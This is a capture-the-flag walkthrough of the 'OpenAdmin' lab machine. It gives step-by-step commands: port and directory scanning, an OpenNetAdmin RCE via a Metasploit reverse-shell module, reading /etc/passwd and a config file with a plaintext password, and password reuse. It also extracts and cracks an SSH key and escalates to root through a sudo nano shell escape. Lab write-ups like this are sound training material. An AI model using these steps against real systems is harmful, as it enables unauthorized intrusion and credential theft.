# OpenAdmin Walkthrough
Date: 2024-09-02

## Service Enumeration
### Initial Scan
I started by running an nmap full port scan:

```bash
nmap -p- $(cat target) -v -oN full_scan_ports
```

The scan revealed two open ports: `22` (SSH) and `80` (HTTP).

Next, I ran a more detailed scan on the specific ports:

```bash
nmap -T4 -p 22,80 -A -oN specific_ports -oX specific_ports.xml -v $(cat target)
```

Results:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

SSH is running on version `OpenSSH 7.6p1`.
HTTP is hosted on Apache 2.4.29.
The target OS is identified as Ubuntu. Now let's dive deeper into port `80`.

***

## Web Enumeration
I visited the IP in a browser and saw the default Apache page. To further enumerate, I ran a directory brute force scan using ffuf:

```bash
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u "http://openadmin.htb/FUZZ" -e .php,.html
```

Discovered Directories:

* `/music/`
* `/artwork/`
* `/sierra/`

Inside `/music/`, I found a link to another directory: `/ona`, which led to OpenNetAdmin.

![ona](https://github.com/user-attachments/assets/dd548014-ff97-4463-ac08-ccc13920eaa1)

***

## OpenNetAdmin Exploitation
OpenNetAdmin Version: 18.1.1

The default credentials (`admin:admin`) worked. This version of OpenNetAdmin is vulnerable to **RCE** (Remote Code Execution).

I confirmed the vulnerability using searchsploit:

```bash
searchsploit OpenNetAdmin 18.1.1
```

I opted to exploit the vulnerability using Metasploit with the module: `exploit/unix/webapp/opennetadmin_ping_cmd_injection` and payload: `linux/x64/meterpreter/reverse_tcp`.

### Resources

* [OpenNetAdmin 18.1.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47691)

***

## User Flag
### Local Enumeration
I gained a meterpreter shell and listed users by reading the `/etc/passwd` file:

```
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

I also found MySQL credentials in the OpenNetAdmin configuration file:

```bash
cat /opt/ona/www/local/config/database_settings.inc.php
```

MySQL User: `ona_sys`
Password: `n1nj4W4rri0R!`
The password also worked for user `jimmy`. I used `su` to switch to Jimmy’s shell:

```bash
su jimmy
```

### Further Enumeration
In `/var/www/internal`, I found three files of interest:

* `index.php`: Performs a login for user `jimmy` with a SHA-512 hashed password (successfully cracked with [CrackStation](https://crackstation.net/)).
* `main.php`: Retrieves joanna's SSH private key if logged in.
* `logout.php`: Logs out of the session.

The Apache virtual host for this web app was configured on port `52846`:

```bash
cat /etc/apache2/sites-available/internal.conf
```

I brute-forced Jimmy’s SHA-512 password using CrackStation and retrieved the password: `Revealed`.

### Retrieving Joanna's SSH Key
After logging into the internal web app, I extracted Joanna’s id_rsa SSH private key:

```bash
curl -X POST localhost:52846/index.php -d "login=login&username=jimmy&password=Revealed" -v
curl localhost:52846/main.php -H "Cookie: PHPSESSID=<session_id>" -v
```

The private key was encrypted, so I used John the Ripper to crack the passphrase:

```bash
ssh2john joanna_id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Passphrase found: `bloodninjas`.

### SSH Access
With the decrypted key, I logged in as joanna:

```bash
ssh -i joanna_id_rsa joanna@$(cat target)
```

I retrieved the user flag from joanna's home directory.

### Resources

* [Cracking SSH Private key passphrase](https://medium.com/the-padlock/cracking-ssh-private-key-passphrase-459ba17e8d5d)
* [CrackStation](https://crackstation.net/)

***

## Root Flag
### Privilege Escalation
Upon logging in as `joanna`, I checked her sudo privileges:

```bash
sudo -l
```

Joanna could run nano on the file /opt/priv without a password:

```
User joanna may run the following command on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

I used nano's built-in shell escape feature to gain root privileges. This technique is documented on GTFOBins:

```bash
Copia codice
sudo /bin/nano /opt/priv
# Inside nano, press CTRL+R, then CTRL+X, then type: sh
```

Now, with root access, I retrieved the root flag.

### Resources

* [GTFOBins](https://gtfobins.github.io/)

***

## Summary
### Key Learnings:
* Enumerating web services and exploiting web vulnerabilities (OpenNetAdmin).
* Cracking passwords (SHA-512 & SSH private key passphrase).
* Privilege escalation via sudo misconfigurations (GTFOBins).

The box was a great exercise in combining web exploitation, password cracking, and privilege escalation techniques.

*** 
